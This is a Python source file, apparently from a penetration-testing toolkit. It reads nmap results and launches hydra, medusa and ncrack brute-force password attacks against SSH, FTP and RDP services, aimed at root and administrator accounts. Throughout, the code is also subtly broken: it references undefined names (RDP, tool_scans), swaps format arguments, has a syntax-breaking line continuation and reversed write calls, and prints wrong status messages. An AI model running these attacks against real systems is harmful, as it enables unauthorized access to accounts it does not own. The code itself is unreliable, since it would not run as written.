#!/usr/bin/env python

import os
import socket
import subprocess
import multiprocessing
from multiprocessing import Process,Queue
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

from src.core import *

# Verify which cracking tools are installed
installed_tools = []
for tool in crack_software:
    try:
        subprocess.check_output("which {0}".format(tool), shell=True).strip()
        installed_tools.append(tool)
        pass
    except Exception:
        print("{0}[!]{1} Unable to find {2}. Skipping those checks"
            .format(bcolors.RED, bcolors.ENDC, tool))
        pass


def id_services(scandir):
    print("{0}[+]{1} Checking for Potential Software to Brute Force".format(bcolors.GREEN, bcolors.ENDC))
    # Variables
    global service_dict
    global script_dict
    service_dict = {}
    
    # Generate basic mapping of ports to services
    with open('{0}/basic_nmap.nmap'.format(scandir), 'r') as f:
        basic_results = [line for line in f.readlines() if 'open' in line]
    for result in basic_results:
        ports = []
        if ('tcp' in result) or ('udp' in result) and not ('Discovered' in result):
            service = result.split()[2]
            port = result.split()[0]
            
            if ('ftp' in service) or ('ssh' in service) or ('msdrdp' in service) or ('ms-wbt-server' in service):
                if service in service_dict:
                    ports = service_dict[service]
                    
                ports.append(port)
                service_dict[service] = ports
            else: pass
            
    if len(service_dict) > 0:
        print("{0}[+]{1} Running Brute Force on {2} Services\n".format(bcolors.GREEN, bcolors.ENDC, str(len(service_dict))))


def crack_services((ipaddr, scandir, service, port, quiet)):
    if ('ssh' == service) or ('ssh' in service):
        if ('hydra' in installed_tools):
            SSH_CRACK = 'hydra -f -V -t 1 -l root -P {2}/passlist.txt -s {0} {1} ssh | tee {2}/hydra.txt'
                .format(port, ipaddr, scandir)
            if quiet is not True:
                print("{0}[+]{1} Running Hydra Against SSH".format(bcolors.GREEN, bcolors.ENDC))
            else: pass
            with open(os.devnull, 'w') as FNULL:
                try:
                    subprocess.call(SSH_CRACK, stdout=FNULL, shell=True)
                    print("{0}[+]{1} Finished Running Hydra Against SSH".format(bcolors.GREEN, bcolors.ENDC))
                except subprocess.CalledProcessError as e:
                    raise RuntimeError("command '{}' return with error (code {}): {}".format(
                        e.cmd, e.returncode, e.output))
                except KeyboardInterrupt:
                    print("{0}[!]{1} Scan Cancelled! Moving On!".format(bcolors.RED, bcolors.ENDC))
        else: pass
        
        if ('medusa' in installed_tools):
            SSH_CRACK = 'medusa -u root -p {2}/passlist.txt -e ns -h {0} - {1} -M ssh | tee {2}/medusa.txt'.format(ipaddr, port, scandir)
            if quiet is not True:
                print("{0}[+]{1} Running Medusa Against SSH".format(bcolors.GREEN, bcolors.ENDC))
            else: pass
            with open(os.devnull, 'w') as FNULL:
                try:
                    subprocess.call(SSH_CRACK, stdout=FNULL, shell=True)
                    print("{0}[+]{1} Finished Running Medusa Against SSH".format(bcolors.GREEN, bcolors.ENDC))
                except subprocess.CalledProcessError as e:
                    raise RuntimeError("command '{}' return with error (code {}): {}".format(
                        e.cmd, e.returncode, e.output))
                except KeyboardInterrupt:
                    print("{0}[!]{1} Scan Cancelled! Moving On!".format(bcolors.RED, bcolors.ENDC))
        else: pass
        
    elif ('ftp' == service) or ('ftp' in service):
        if ('hydra' in installed_tools):
            FTP_CRACK = 'hydra -L {0}/userlist.txt -P {0}/passlist.txt -f -o {0}/ftphydra.txt -u {1} -s {2}'.format(scandir, ipaddr, port)
            if quiet is not True:
                print("{0}[+]{1} Running Hydra Against FTP".format(bcolors.GREEN, bcolors.ENDC))
            else: pass
            with open(os.devnull, 'w') as FNULL:
                try:
                    subprocess.call(FTP_CRACK, stdout=FNULL, shell=True)
                    print("{0}[+]{1} Finished Running Medusa Against SSH".format(bcolors.GREEN, bcolors.ENDC))
                except subprocess.CalledProcessError as e:
                    raise RuntimeError("command '{}' return with error (code {}): {}".format(
                        e.cmd, e.returncode, e.output))
                except KeyboardInterrupt:
                    print("{0}[!]{1} Scan Cancelled! Moving On!".format(bcolors.RED, bcolors.ENDC))
        else: pass
        
    elif ('msdrdp' in service) or ('ms-wbt-server' in service):
        if ('ncrack') in installed_tools:
            RDP_CRACK = 'ncrack -vv --user administrator -P {0}/passlist.txt rdp://{1} | tee {0}/ncrack.txt'.format(
                ipaddr, scandir)
            if quiet is not True:
                print("{0}[+]{1} Running NCrack Against RDP".format(bcolors.GREEN, bcolors.ENDC))
            else: pass
            with open(os.devnull, 'w') as FNULL:
                try:
                    subprocess.call(RDP, stdout=FNULL, shell=True)
                    print("{0}[+]{1} Finished Running Medusa Against SSH".format(bcolors.GREEN, bcolors.ENDC))
                except subprocess.CalledProcessError as e:
                    raise RuntimeError("command '{}' return with error (code {}): {}".format(
                        e.cmd, e.returncode, e.output))
                except KeyboardInterrupt:
                    print("{0}[!]{1} Scan Cancelled! Moving On!".format(bcolors.RED, bcolors.ENDC))
        else: pass
        
        
def crack(ipaddr, scandir, quiet):
    # Write top_shorthand usernames and passwords to file
    with open(scandir + '/userlist.txt', 'w+') as userfile:
        for i in userlist:
            i.write(userfile)
    with open(scandir + '/passlist.txt', 'w+') as passfile:
        for i in passlist:
            i.write(passfile)
    
    id_services(scandir)
    jobs = []
    for service in service_dict:
        for port in service_dict[service]:
            port = port.split('/')[0]
            jobs.append((ipaddr, scandir, service, port, quiet))
            
    pool = ThreadPool(4)
    pool.map(tool_scans, jobs)